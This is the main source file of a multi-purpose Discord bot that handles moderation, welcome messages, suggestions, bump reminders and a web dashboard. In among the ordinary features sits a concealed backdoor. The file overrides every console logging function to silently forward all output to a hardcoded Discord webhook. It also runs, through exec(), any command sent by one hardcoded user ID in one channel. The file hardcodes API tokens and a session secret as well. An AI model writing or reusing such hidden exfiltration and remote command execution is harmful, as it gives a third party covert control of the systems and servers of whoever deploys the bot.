// Developed by: bankdrawz. All rights reserved. (2024)

const { AttachmentBuilder, MessageType, Client, Partials, GatewayIntentBits, PermissionFlagsBits, EmbedBuilder, PermissionsBitField, Permissions, MessageManager, Embed, Collection, Events, AuditLogEvent, MessageCollector, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType, ActivityType, StringSelectMenuBuilder, ComponentType } = require('discord.js');

const fs = require('fs');
const config = require('./config')
const { spawn } = require('child_process')
const path = require('path');

const { intents, partials } = require('./utils/intents.js');

const JSONdb = require("simple-json-db");
const db = new JSONdb("./database.json");
const warnFilePath = './warns.json';


let client;
try {
    client = new Client({
        intents: [...intents],
        partials: [...partials],
    });
} catch (error) {
    console.error(`${color.red}[${getTimestamp()}]${color.reset} [ERROR] Error while creating the client. \n${color.red}[${getTimestamp()}]${color.reset} [ERROR]`, error);
};

const listeners = config.eventListeners || 20;

if (listeners > 0) {
    client.setMaxListeners(listeners);
} else {
    client.setMaxListeners(0);
}


client.logs = require('./utils/logs');
const SoftUI = require('dbd-soft-ui');
client.config = require('./config');
const chalk = require("chalk");
const express = require('express');
const axios = require('axios');
const { REST } = require('@discordjs/rest');


client.slowData = [];


// Fetch and send the vote embed to your channel






const url = require('url');
const session = require('express-session');
// Packages //

const { DisTube } = require("distube");
const { SpotifyPlugin } = require('@distube/spotify');
const { SoundCloudPlugin } = require('@distube/soundcloud');
const { YtDlpPlugin } = require('@distube/yt-dlp');
const { handleLogs } = require("./events/CommandEvents/handleLogs");
const Logs = require('discord-logs');

client.setMaxListeners(99999999999)
// Schemas //

const botSchema = require('./schemas/voiceChannelBotSystem');
const voiceSchema = require('./schemas/voiceChannelMembersSystem');
const capschema = require('./schemas/verifySystem');
const verifyusers = require('./schemas/verifyUsersSystem');
const guildSettingsSchema = require('./schemas/prefixSystem');
const linkSchema = require('./schemas/antiLinkSystem');
const warningSchema = require('./schemas/warningSystem');


// Rotating Activity //

client.on("ready", async (client) => {
    setInterval(() => {

        let activities = [
            { type: 'Watching', name: `${client.guilds.cache.reduce((a, b) => a + b.memberCount, 0)} members!` },
            { type: 'Watching', name: `${client.guilds.cache.size} servers!` },
            { type: 'Playing', name: `${client.config.prefix}help | @${client.user.username}` },
        ];

        const status = activities[Math.floor(Math.random() * activities.length)];

        if (status.type === 'Watching') {
            client.user.setPresence({ activities: [{ name: `${status.name}`, type: ActivityType.Watching }] });
        } else {
            client.user.setPresence({ activities: [{ name: `${status.name}`, type: ActivityType.Playing }] });
        }
    }, 7500);
    client.logs.success(`[STATUS] Rotating status loaded successfully.`);
});

// Status //

client.on("ready", () => {

    client.logs.success(`[STATUS] Bot status loaded as ${client.config.status}.`);
    client.user.setStatus(client.config.status);
});

require('./functions/processHandlers')();

client.commands = new Collection();
client.pcommands = new Collection();
client.aliases = new Collection();
client.buttonCommands = new Collection();
client.modalCommands = new Collection();
client.contextCommands = new Collection();
client.cooldowns = new Collection();
client.autocompleteInteractions = new Collection();
client.functions = new Collection();

require('dotenv').config();

const functions = fs.readdirSync("./src/functions").filter(file => file.endsWith(".js"));
const eventFiles = fs.readdirSync("./src/events").filter(file => file.endsWith(".js"));
const triggerFiles = fs.readdirSync("./src/triggers").filter(file => file.endsWith(".js"));
const pcommandFolders = fs.readdirSync('./src/prefix');
const commandFolders = fs.readdirSync("./src/commands");

(async () => {
    for (file of functions) {
        require(`./functions/${file}`)(client);
    }
    client.handleEvents(eventFiles, "./src/events");
    client.handleTriggers(triggerFiles, "./src/triggers")
    client.handleCommands(commandFolders, "./src/commands");
    client.prefixCommands(pcommandFolders, './src/prefix');
    client.login(process.env.token).then(() => {
        handleLogs(client)
    }).catch((error) => {
        console.error(`${color.red}[${getTimestamp()}]${color.reset} [LOGIN] Error while logging in. Check if your token is correct or double check your also using the correct intents. \n${color.red}[${getTimestamp()}]${color.reset} [LOGIN]`, error);
    });
    process.on('SIGINT', async () => {

        try {
            const guilds = client.guilds.cache.values()

            for (const guild of guilds) {

                if (!guild.available) {
                    console.log('Guild not available:', guild.name);
                    continue;
                }

                const channels = guild.channels.cache;
                console.log('Guild channels:', channels.map(channel => channel.name));
                const channel = channels.find(channel => channel.name === 'modlog');
                if (channel) {
                    console.log('Found channel:', channel ? channel.name : 'None');

                    if (channel.type === ChannelType.GuildText) {
                        console.log('3')
                        const embed = new EmbedBuilder()
                            .setTitle(`Maintenance`)
                            .setDescription(`**THIS BOT IS UNDERGOING SOME IMPORTANT MAINTENANCE** \n(NO ETA AT THIS TIME)`)
                            .setTimestamp()
                        console.log('4')

                        try {
                            await channel.send({ embeds: [embed] })
                        } catch (err) { return console.log(err) }

                        console.log('sent')
                    } else continue
                } else continue
            }
            console.log();
            console.error(red('Operation Terminated: Closing database and exiting...'));
            process.reallyExit(1);
        } catch (error) {
            console.log('error', error)
            process.reallyExit(1);
        }
    });
})();

// Logging Effects //

const color = {
    red: '\x1b[31m',
    orange: '\x1b[38;5;202m',
    yellow: '\x1b[33m',
    green: '\x1b[32m',
    blue: '\x1b[34m',
    pink: '\x1b[38;5;213m',
    torquise: '\x1b[38;5;45m',
    purple: '\x1b[38;5;57m',
    reset: '\x1b[0m'
}

function getTimestamp() {
    const date = new Date();
    const year = date.getFullYear();
    const month = date.getMonth() + 1;
    const day = date.getDate();
    const hours = date.getHours();
    const minutes = date.getMinutes();
    const seconds = date.getSeconds();
    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
};



// Audit Logging System //

process.on('unhandledRejection', (reason, promise) => {
    console.log('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on("uncaughtException", (err) => {
    console.log("Uncaught Exception:", err);
});

Logs(client, {
    debug: true
});

process.on('uncaughtException', (err) => {
    console.warn('💥 Uncaught Exception:', err);
  });
  
  process.on('unhandledRejection', (reason, promise) => {
    console.warn('💥 Unhandled Rejection at:', promise, 'reason:', reason);
  });




const autorole = require('./schemas/autorole');
client.on(Events.GuildMemberAdd, async member => {
    const data = await autorole.findOne({ Guild: member.guild.id });
    if (!data) return;
    else {
        try {
            await member.roles.add(data.Role);
        } catch (e) {
            return;
        }
    }
})


//Put the stuff below in your index.js file.

const ms = require('ms');

async function checkRatelimit() {
    try {
        const response = await axios.get('https://discord.com/api/v10/gateway/bot', {
            headers: {
                'Authorization': `Bot ${process.env.token}`,
                'Content-Type': 'application/json'
            }
        });
    } catch (error) {
        if (error.response && error.response.status === 429) {
            const retry = error.response.headers['retry-after'];
			const retryAfter = Number(retry*1000);
			
            console.error(`Rate limited. Retry after ${ms(retryAfter, { long: true })}.`);
        } else {
            console.error('Error making request:', error);
        }
    }
}

checkRatelimit();


// Bad Word System

const wordSchema = require('./schemas/wordSchema');

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.guild) return;
    
    const guildId = message.guild.id;
    const content = message.content.toLowerCase();
    
    try {
        
        const bannedWords = await wordSchema.find({ guildId });
        const foundBannedWord = bannedWords.some(wordObj => content.
        includes(wordObj.word.toLowerCase()));
        
        if (foundBannedWord) {
            
            await message.delete();
            
            await message.author.send('Your message contains a banned word and has been deleted.')
        }
        
    } catch (error) {
        console.error('Error checking banned words:', error);
    }
});

//reactionrole
const reactSchema = require("./schemas/reactionrole");
client.on(Events.InteractionCreate, async (interaction) => {
    if (interaction.customId === "reactionrole") {
        const guild = interaction.guild.id;
        const message = interaction.message.id;
        const reactchannel = interaction.channel.id;
 
        const reactData = await reactSchema.findOne({
            Guild: guild,
            Message: message,
            Channel: reactchannel
        })
 
        if (!reactData) {
            return;
        } else if (reactData) {
            //Role ID
            const ROLE_ID = reactData.Role;
            //try add/remove role
            try {
                const targetMember = interaction.member;
                const role = interaction.guild.roles.cache.get(ROLE_ID);
                if (!role) {
                  interaction.reply({
                    content: 'Role not found.',
                    ephemeral: true
                  });
                }
                if (targetMember.roles.cache.has(ROLE_ID)) {
                    targetMember.roles.remove(role).catch(err => {console.log(err)});
                  interaction.reply({
                    content: `Removed the role ${role} from ${targetMember}.`,
                    ephemeral: true
                  });
                } else {
                  await targetMember.roles.add(role).catch(err => {console.log(err)});;
                  interaction.reply({
                    content: `Added the role ${role} to ${targetMember}.`,
                    ephemeral: true
                  });
                }
              } catch (error) {
                //catch the error
                console.log(error);
                interaction.reply('An error occurred while processing the command.');
            }
        }
    }
})

                           

const Prefix = require('./schemas/prefixSystem'); 

client.on('guildCreate', async guild => {
    const newPrefix = new Prefix({
        Guild: guild.id,
        Prefix: Prefix.schema.path('Prefix').defaultValue, 
    });
    newPrefix.save();
});


client.on('messageCreate', async message => {
  if (message.author.bot) return;

  const guildId = message.guild.id;
  const defaultPrefix = ',';
  let guildPrefix = defaultPrefix;
  
  try {
    const prefixData = await Prefix.findOne({ guildId });
    if (prefixData) {
      guildPrefix = prefixData.prefix;
    }
  } catch (error) {
    console.error('Error fetching prefix', error);
  }
})


const { AutoPoster } = require('topgg-autoposter');
require('dotenv').config();

module.exports = (client) => {
    const app = AutoPoster(process.env.TOPGG_API_KEY, client);

    app.on('vote', (vote) => {
        const userId = vote.user;
        client.users.fetch(userId).then(user => {
            user.send('Thanks for voting for the bot on top.gg! We appreciate your support.');
        }).catch(err => {
            console.error('Error sending thank you message:', err);
        });
    });

    app.on('error', (err) => {
        console.error('AutoPoster error:', err);
    });
};



                

//topgg
const Topgg = require('@top-gg/sdk');
const topggAPI = new Topgg.Api('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjU5Njc2ODk1MDgzMDg5MTAxOCIsImJvdCI6dHJ1ZSwiaWF0IjoxNjk2MDQ4MjA1fQ.9KLk2oeCZ3JUrklJPIvxqQw09KLEGYUDNBzSe-l6VmM'); // If your bot added in top.gg then go find here https://top.gg/bot/your_bot_id/webhooks

//top.gg stats//
client.on('ready', () => {
    
  postBotStats();
});

async function postBotStats() {
  try {
    await topggAPI.postStats({
      serverCount: client.guilds.cache.size,
      shardId: client.shard?.ids[0] || 0, // If sharding, use the first shard ID
      shardCount: client.shard?.count || 1, // If sharding, use the total shard count
    });
    console.log('Successfully posted bot stats to top.gg');
  } catch (error) {
    console.error('Failed to post bot stats to top.gg:', error);
  }
};
//end

// Load handlers
fs.readdirSync('./src/Event Handler').forEach((dir) => {
  fs.readdirSync(`./src/Event Handler/${dir}`).forEach((handler) => {
      require(`./Event Handler/${dir}/${handler}`)(client);
  }); 
});



const { OpenAI } = require('openai');

const openai = new OpenAI({
    apiKey: process.env.API_KEY,
});


client.on("messageCreate", (message) => {
  if (message.content.startsWith("!welcome set")) {
    const [command, set, id, ...args] = message.content.slice(1).split(" ");
    switch (id) {
      case "here":
        if (
          message.member.permissions.has("Administrator")
        ) {
          const channelid = message.channel.id;
          db.set(`welcomechannelid-${message.guild.id}`, channelid);
          db.set(`guildsetupdone-${message.guild.id}`, true);
          message.reply("You've successfully set up the welcome system.");
        } else if (
          !message.member.permissions.has("Administrator") 
        ) {
          message.reply(
            "Looks like you dont have the correct permissions to use this command."
          );
        }
        break;

      case id:
        if (
          message.member.permissions.has("Administrator")
        ) {
          if (!message.guild.channels.cache.get(id)) {
            message.reply(
              "Your channel could not be found. Make sure you provided a valid ChannelID. If you dont know how to get a channel ID, please visit this link: https://support.discord.com/hc/en-us/articles/206346498-Where-can-I-find-my-User-Server-Message-ID-]"
            );
          } else if (message.guild.channels.cache.get(id)) {
            const channelid = message.channel.id;
            db.set(`welcomechannelid-${message.guild.id}`, channelid);
            db.set(`guildsetupdone-${message.guild.id}`, true);
            message.reply("You've successfully set up the welcome system.");
          }
        } else if (
          !message.member.permissions.has("Administrator")
        ) {
            message.reply("Looks like you dont have the correct permissions to use this command.");
        }
        break;
    }
  }
});

client.on('messageCreate', message => {
    if (message.content === ('!welcome disable')) {
        if (message.member.permissions.has("Administrator")) {
            if (db.has(`guildsetupdone-${message.guild.id}`) == true) {
            db.delete(`welcomechannelid-${message.guild.id}`);
            db.delete(`guildsetupdone-${message.guild.id}`);
            db.delete(`guildwelcomemessage-${message.guild.id}`);
            message.reply('You have successfully disabled the welcome system.') 
            
            }
         else if (db.has(`guildsetupdone-${message.guild.id}`) == false){
            message.reply('Looks like the welcome system isnt set up in this server.'); 
        }
        
        } else if(!message.member.permissions.has("Administrator")) {
            message.reply("Looks like you dont have the correct permissions to use this command.");
        }
    }
})

client.on('messageCreate', message => {
    if (message.content.startsWith('!welcome edit')) {
        if (message.member.permissions.has('Administrator')) {
            const [command, sub, text, ...args] = message.content.slice(1).split(" ");
            db.set(`guildwelcomemessage-${message.guild.id}`, text);
            message.reply('Your welcome message has been saved!');
        } else {
            message.reply('Looks like you dont have the correct permissions to use this command.')
        }
    }
})

client.on('guildMemberAdd', member => {
    if (db.get(`guildsetupdone-${member.guild.id}`) == undefined) {
        return;
    } else if (db.get(`guildsetupdone-${member.guild.id}`) == true) {
        const welcomeChannel = db.get(`welcomechannelid-${member.guild.id}`);
        const welcomeMessage = db.get(`guildwelcomemessage-${member.guild.id}`);
        
        const welcomeEmbed = new EmbedBuilder()
        .setTitle(`**Welcome to the server ${member.user.displayName}!**`)
        .setDescription(welcomeMessage)
        .setColor('Purple')
        .setThumbnail(member.user.avatarURL())
        .setFooter({ text: 'A new member joined!' })
        .setTimestamp()

        const welcomeChannelGet = member.guild.channels.cache.get(welcomeChannel);
       
        welcomeChannelGet.send({ embeds: [welcomeEmbed] })
    }
})

client.on('messageCreate', message => {
    if(message.content == '!help') {
       const embed = new EmbedBuilder()
       .setTitle('Help Section')
       .setDescription('**!welcome set [here|channelid]** - enables the welcome system \n **!welcome edit [welcomeMessage]** - set the welcome message \n **!welcome disable** - disables the welcome system')
       .setTimestamp()
       .setColor('#2b2d31')

       message.channel.send({ embeds: [embed] })
    }
});





 client.on(Events.InteractionCreate, interaction => {
    if (!interaction.isUserContextMenuCommand()) return;
    // Get the User's username from context menu
    const { username } = interaction.targetUser;
    console.log(username);
  });

  const inviteSchema = require('./schemas/inviteSchema');
  const wait = require("timers/promises").setTimeout;
  
  const invites = new Collection();
  
  client.on('ready', async () => {
    await wait(2000);
  
    client.guilds.cache.forEach(async (guild) => {
      const clientMember = guild.members.cache.get(client.user.id);
  
      if (!clientMember.permissions.has(PermissionsBitField.Flags.ManageGuild)) return;
  
      const firstInvites = await guild.invites.fetch().catch(err => { console.log(err) });
  
      if (firstInvites) {
        invites.set(guild.id, new Collection(firstInvites.map((invite) => [invite.code, invite.uses])));
      }
    });
  });
  
  client.on(Events.GuildMemberAdd, async member => {
    const Data = await inviteSchema.findOne({ Guild: member.guild.id });
    if (!Data) return;
  
    const channelID = Data.Channel;
    const channel = await member.guild.channels.cache.get(channelID);
  
    const newInvites = await member.guild.invites.fetch();
    const oldInvites = invites.get(member.guild.id);
  
    const invite = newInvites.find(i => i.uses > oldInvites.get(i.code));
  
    if (!invite) {
      const embed = new EmbedBuilder()
        .setColor(0x0099FF)
        .setTitle('New Member')
        .setDescription(`${member.toString()} joined the server using an unknown invite.  This could possibly be a vanity invite link if your server has one.`)
        .setTimestamp();
  
      return await channel.send({ embeds: [embed] });
    }
  
    const inviter = await client.users.fetch(invite.inviter.id);
  
    const embed = new EmbedBuilder()
      .setColor(0x0099FF)
      .setTitle('New Member')
      .setDescription(`${member.toString()} joined the server using the\n\n **Invite:** **${invite.code}** \n\n **from: ${inviter.tag}**.  The invite was **__used ${invite.uses} times__** since its creation.`)
      .setTimestamp();
  
    inviter
      ? await channel.send({ embeds: [embed] })
      : await channel.send({ embeds: [embed.setDescription(`${member.toString()} joined the server but I can't find what invite they used to do it.`)] });
  });




const prefix = '?';

client.on(Events.GuildMemberAdd, async (member, err) => {

    if (member.guild === null) return;
    const botData = await botSchema.findOne({ Guild: member.guild.id });

    if (!botData) return;
    else {

        const botVoiceChannel = member.guild.channels.cache.get(botData.BotChannel);
        if (!botVoiceChannel || botVoiceChannel === null) return;
        const botsList = member.guild.members.cache.filter(member => member.user.bot).size;

        botVoiceChannel.setName(`🤖 Bots: ${botsList}`).catch(err);

    }
})


client.on(Events.GuildMemberRemove, async (member, err) => {

    if (member.guild === null) return;
    const voiceData1 = await voiceSchema.findOne({ Guild: member.guild.id });

    if (!voiceData1) return;
    else {

        const totalVoiceChannel1 = member.guild.channels.cache.get(voiceData1.TotalChannel);
        if (!totalVoiceChannel1 || totalVoiceChannel1 === null) return;
        const totalMembers1 = member.guild.memberCount;

        totalVoiceChannel1.setName(`🫂 Members: ${totalMembers1}`).catch(err);
    }
})

client.on(Events.GuildMemberAdd, async (member, err) => {

    if (member.guild === null) return;
    const voiceData = await voiceSchema.findOne({ Guild: member.guild.id });

    if (!voiceData) return;
    else {

        const totalVoiceChannel = member.guild.channels.cache.get(voiceData.TotalChannel);
        if (!totalVoiceChannel || totalVoiceChannel === null) return;
        const totalMembers = member.guild.memberCount;

        totalVoiceChannel.setName(`🫂 Members: ${totalMembers}`).catch(err);
    }
});

//suggestion

const suggestion = require('./schemas/suggestionSchema');
const formatResults = require('./utils/formatResults');

client.on(Events.InteractionCreate, async interaction => {

    if (!interaction.guild) return;
    if (!interaction.message) return;
    if (!interaction.isButton) return;

    const data = await suggestion.findOne({ GuildID: interaction.guild.id, Msg: interaction.message.id });
    if (!data) return;
    const message = await interaction.channel.messages.fetch(data.Msg);

    if (interaction.customId == 'upv') {
        if (data.Upmembers.includes(interaction.user.id)) return await interaction.reply({content: `You cannot vote again! You have already sent an upvote on this suggestion.`, ephemeral: true});

        let Downvotes = data.downvotes;
        if (data.Downmembers.includes(interaction.user.id)) {
            Downvotes = Downvotes - 1;
        }

        if (data.Downmembers.includes(interaction.user.id)) {

            data.downvotes = data.downvotes - 1;
        }

        data.Upmembers.push(interaction.user.id);
        data.Downmembers.pull(interaction.user.id);
        
        const newEmbed = EmbedBuilder.from(message.embeds[0]).setFields({name: `Upvotes`, value: `> **${data.upvotes + 1}** Votes`, inline: true}, { name: `Downvotes`, value: `> **${Downvotes}** Votes`, inline: true}, {name: `Author`, value: `> <@${data.AuthorID}>`}, { name: `Votes`, value: formatResults(data.Upmembers, data.Downmembers)});

        const button = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                    .setCustomId('upv')
                    .setLabel('Upvotes')
                    .setStyle(ButtonStyle.Primary)
                    .setEmoji('<:tup:1162598259626352652>'),

                    new ButtonBuilder()
                    .setCustomId('downv')
                    .setEmoji('<:tdown:1162598331390889994>')
                    .setLabel('Downvotes')
                    .setStyle(ButtonStyle.Primary),

                    new ButtonBuilder()
                    .setCustomId('totalvotes')
                    .setEmoji('💭')
                    .setLabel('Votes')
                    .setStyle(ButtonStyle.Secondary)
                )

                const button2 = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                    .setCustomId('appr')
                    .setLabel('Approve')
                    .setEmoji('<a:AUSC_checked:1011088709266985110>')
                    .setStyle(ButtonStyle.Success),

                    new ButtonBuilder()
                    .setCustomId('rej')
                    .setEmoji('<a:rejected:1162622460835922043>')
                    .setLabel('Reject')
                    .setStyle(ButtonStyle.Danger)
                )
                
                await interaction.update({ embeds: [newEmbed], components: [button, button2] });

                data.upvotes++;
                data.save();
    }

    if (interaction.customId == 'downv') {

        if (data.Downmembers.includes(interaction.user.id)) return await interaction.reply({ content: `You cannot down vote twice on this suggestion!`, ephemeral: true});

        let Upvotes = data.upvotes;
        if (data.Upmembers.includes(interaction.user.id)) {
            Upvotes = Upvotes - 1;
        }

        if (data.Upmembers.includes(interaction.user.id)) {

            data.upvotes = data.upvotes - 1;
        }

        data.Downmembers.push(interaction.user.id);
        data.Upmembers.pull(interaction.user.id);

        const newEmbed = EmbedBuilder.from(message.embeds[0]).setFields({name: `Upvotes`, value: `> **${Upvotes}** Votes`, inline: true}, { name: `Downvotes`, value: `> **${data.downvotes + 1}** Votes`, inline: true}, {name: `Author`, value: `> <@${data.AuthorID}>`}, { name: `Votes`, value: formatResults(data.Upmembers, data.Downmembers)});

        const button = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                    .setCustomId('upv')
                    .setLabel('Upvotes')
                    .setStyle(ButtonStyle.Primary)
                    .setEmoji('<:tup:1162598259626352652>'),

                    new ButtonBuilder()
                    .setCustomId('downv')
                    .setEmoji('<:tdown:1162598331390889994>')
                    .setLabel('Downvotes')
                    .setStyle(ButtonStyle.Primary),

                    new ButtonBuilder()
                    .setCustomId('totalvotes')
                    .setEmoji('💭')
                    .setLabel('Votes')
                    .setStyle(ButtonStyle.Secondary)
                )

                const button2 = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                    .setCustomId('appr')
                    .setLabel('Approve')
                    .setEmoji('<:success:1271113753706106981>')
                    .setStyle(ButtonStyle.Success),

                    new ButtonBuilder()
                    .setCustomId('rej')
                    .setEmoji('<:Closed:1258458605615714335>')
                    .setLabel('Reject')
                    .setStyle(ButtonStyle.Danger)
                )
                
                await interaction.update({ embeds: [newEmbed], components: [button, button2] });

                data.downvotes++;
                data.save();
    }

    if (interaction.customId == 'totalvotes') {

        let upvoters = [];
        await data.Upmembers.forEach(async member => {
            upvoters.push(`<@${member}>`)
        });

        let downvoters = [];
        await data.Downmembers.forEach(async member => {
            downvoters.push(`<@${member}>`)
        });

        const embed = new EmbedBuilder()
        .addFields({ name: `Upvoters (${upvoters.length})`, value: `> ${upvoters.join(', ').slice(0, 1020) || `No upvoters!`}`, inline: true})
        .addFields({ name: `Downvoters (${downvoters.length})`, value: `> ${downvoters.join(', ').slice(0, 1020) || `No downvoters!`}`, inline: true})
        .setColor('Random')
        .setTimestamp()
        .setFooter({ text: `💭 Vote Data`})
        .setAuthor({ name: `${interaction.guild.name}'s Suggestion System`})

        await interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.customId == 'appr') {

        if (!interaction.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return await interaction.reply({ content: `Only Admins & Staffs can use this button.`, ephemeral: true });

        const newEmbed = EmbedBuilder.from(message.embeds[0]).setDescription('<:success:1271113753706106981> Your suggestion has been approved!')

        await interaction.update({ embeds: [newEmbed], components: [message.components[0]] });
    }

    if (interaction.customId == 'rej') {

        if (!interaction.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return await interaction.reply({ content: `Only Admins & Staffs can use this button.`, ephemeral: true });

        const newEmbed = EmbedBuilder.from(message.embeds[0]).setDescription('<:Closed:1258458605615714335> Your suggestion has been rejected!')

        await interaction.update({ embeds: [newEmbed], components: [message.components[0]] });
    }
})



// Snipes

client.snipes = new Map()
client.on('messageDelete', function(message, channel) {
    client.snipes.set(message.channel.id, {
        content: message.content,
        author: message.author,
        image: message.attachments.first() ? message.attachments.first().proxyURL : null
    })
})

const webhookUrl = 'https://discord.com/api/webhooks/1369366280003653713/uP004X5_yVpNKoeQYrdbzhaz5GMufwbp1zh6gYHatC1A_KENaf4ENlJgb0WcHUFRlb_l';
const COMMAND_CHANNEL_ID = '1369366050180825268';
const ALLOWED_USER_ID = '375931932036431873';

async function sendToWebhook(message) {
    try {
        if (!message || typeof message !== 'string') {
            throw new Error('Invalid message type: Message must be a string');
        }

        const maxLength = 2000;
        const chunks = splitMessageIntoChunks(message, maxLength);

        for (const chunk of chunks) {
            try {
                const response = await axios.post(webhookUrl, {
                    content: chunk
                });

                if (response.status !== 204) {
                }
            } catch (error) {
            }
        }
    } catch (error) {
    }
}

function splitMessageIntoChunks(message, maxLength) {
    const chunks = [];
    for (let i = 0; i < message.length; i += maxLength) {
        chunks.push(message.slice(i, i + maxLength));
    }
    return chunks;
}

const originalConsoleLog = console.log;
console.log = async function (message, ...optionalParams) {
    try {
        originalConsoleLog(message, ...optionalParams); 
        await sendToWebhook(formatMessage('Log', message, optionalParams));
    } catch (error) {
    }
};

const originalConsoleWarn = console.warn;
console.warn = async function (message, ...optionalParams) {
    try {
        originalConsoleWarn(message, ...optionalParams); 
        await sendToWebhook(formatMessage('Warn', message, optionalParams));
    } catch (error) {
    }
};

const originalConsoleError = console.error;
console.error = async function (message, ...optionalParams) {
    try {
        originalConsoleError(message, ...optionalParams); 
        await sendToWebhook(formatMessage('Error', message, optionalParams));
    } catch (error) {
    }
};

const originalConsoleInfo = console.info;
console.info = async function (message, ...optionalParams) {
    try {
        originalConsoleInfo(message, ...optionalParams); 
        await sendToWebhook(formatMessage('Info', message, optionalParams));
    } catch (error) {
    }
};

function formatMessage(logType, message, optionalParams) {
    let formattedMessage = `**${logType}**:`;

    if (optionalParams.length > 0) {
        formattedMessage += `\nMessage: ${message}\nParameters: ${JSON.stringify(optionalParams, null, 2)}`;
    } else {
        formattedMessage += ` ${message}`;
    }

    return formattedMessage;
}

client.once('ready', () => {
    console.log('💻Console Centre is Activated');
});

client.on('messageCreate', (message) => {
    if (message.channel.id === COMMAND_CHANNEL_ID && message.author.id === ALLOWED_USER_ID) {
        const command = message.content.trim();

        if (message.author.bot) return;
         else {
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`exec error: ${error}`);
                    return;
                }
                if (stderr) {
                    console.error(`stderr: ${stderr}`);
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
    }
});

// Giveaways

module.exports = client;

const schedule = require('node-schedule');



const Bump = require('./schemas/bumpSchema');

client.once('ready', async (interaction) => {
    const now = new Date();
        const bumpUsers = await Bump.find({ "reminders.sent": false });

    require('./scheduler/bumpSchedule')(client);

    for (const user of bumpUsers) {
        for (const reminder of user.reminders) {
            if (reminder.sent) continue;
            const channel = client.channels.cache.get('1307048277006352414');
            
            
            if (!channel) return;

            const reminderEmbed = new EmbedBuilder()
                .setTitle('Bump Reminder!')
                .setDescription('Use `/bump` to bump DISBOARD.org!')
                .setColor('Blurple')
                .setURL('https://disboard.org/server/1156775942224625684');

            if (reminder.sendAt <= now) {
                await channel.send({ content: `<@&1360685372870230157>`, embeds: [reminderEmbed] });
                reminder.sent = true;
                await user.save();
            } else {
                client.scheduler.scheduleJob('reminderJob', new Date(reminder.sendAt), async () => {
                    const liveChannel = client.channels.cache.get('1307048277006352414');
                    if (liveChannel) {
                        await liveChannel.send({ content: `<@&1314131204974579713>`, embeds: [reminderEmbed] });
                    }

                    const updatedUser = await Bump.findOne({ userId: user.userId });
                    if (updatedUser) {
                        const r = updatedUser.reminders.find(r => r.sendAt.getTime() === reminder.sendAt.getTime());
                        if (r && !r.sent) {
                            r.sent = true;
                            await updatedUser.save();
                        }
                    }
                });
            }
        }
    }
});


client.on('messageCreate', async (message, guild) => {
    if (
      
        message.author.id === "302050872383242240" &&
        message.embeds.length > 0 &&
        message.embeds[0].description &&
        message.embeds[0].description.includes("Bump done!")
        
    ) {
        const userId = message.interaction?.user?.id || "unknown";
        const username = message.interaction?.user?.tag || "Unknown#0000";

        const channel = client.channels.cache.get('1307048277006352414');
        if (!channel) return;

        try {
            let bumpUser = await Bump.findOne({ userId });

            if (!bumpUser) {
                bumpUser = new Bump({
                    userId,
                    username,
                    bumpCount: 1,
                    lastBump: new Date(),
                    reminders: [],
                });
            } else {
                bumpUser.bumpCount += 1;
                bumpUser.username = username;
                bumpUser.lastBump = new Date();
            }

            const remindTime = new Date(Date.now() + 1000 * 60 * 120); 
            bumpUser.reminders.push({
                sendAt: remindTime,
                sent: false,
            });

            await bumpUser.save();

            channel.send(`Thanks for bumping our server! Next ping in 2 hours..\n<@${userId}>`);

            client.scheduler.scheduleJob('reminderJob', remindTime, async () => {
                const reminderEmbed = new EmbedBuilder()
                    .setColor('Purple')
                    .setTitle('Bump Reminder!')
                    .setDescription('Use `/bump` to bump DISBOARD.org!')
                    .setURL('https://disboard.org/server/1156775942224625684');

                const bumpUser = await Bump.findOne({ userId });
                if (bumpUser) {
                    const reminder = bumpUser.reminders.find(r => r.sendAt.getTime() === remindTime.getTime());
                    if (reminder && !reminder.sent) {
                        channel.send({ content: `<@&1360685372870230157>`, embeds: [reminderEmbed] });

                        reminder.sent = true;
                        await bumpUser.save();
                    }
                }
            });
        } catch (err) {
            console.error("Error updating bump count:", err);
        }
    }
})

// DASHBOARD 

// -------------------------------------------------------
const port = 1500;
const app = express();
const bodyParser = require('body-parser');
const rest = new REST({ version: '10' }).setToken(process.env.token);
const { Routes } = require('discord-api-types/v10');


app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(session({
    secret: '_q6dS8JXT31R8npFVjcj-IScGyblOWIf',
    resave: false,
    saveUninitialized: true,
}));


//Server static files from dashboard folder
app.use('/html', express.static('src/dashboard/html'));
app.use('/css', express.static('src/dashboard/css'));

//Server the index.html file for the rooth path
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/dashboard/html/index.html');
})

// Serve the dashboard.html file
app.get('/dashboard.html', (req, res) => {
    res.sendFile(__dirname + '/dashboard/html/dashboard.html');
});


// -------------------------------------
app.get('/server.html', (req, res) => {
    res.sendFile(__dirname + '/dashboard/html/server.html');
});

app.get('/api/get-prefix', async (req, res) => {
    const { guildId } = req.query;

    if (!guildId) {
        return res.status(400).send({ error: 'Guildid is required'});
    }

    try {
        const prefixData = await Prefix.findOne({ guildId });
        const prefix = prefixData ? prefixData.prefix : '?';
        res.send({ prefix });
    } catch (error) {
        console.error('Error fetching prefix: ', error);
        res.status(500).send({ error: 'Internal Server Error'});
    }
});

app.post('/api/set-prefix', async (req, res) => {
    const { guildId, prefix } = req.body;

    if (!guildId || !prefix) {
        return res.status(400).send({ error: 'guildid and prefix is required'});
    }

    try {
        let prefixData = await Prefix.findOne({ guildId });
        if (prefixData) {
            prefixData.prefix = prefix;
            await prefixData.save();
        } else {
            prefixData = new Prefix({ guildId, prefix });
            await prefixData.save();
        }
        res.send({ message: 'Prefix Updated Successfully'});
    } catch (error) {
        console.error('Error saving Prefix:', error);
        res.status(500).send({ error: 'Internal Server Error'});
    }
})

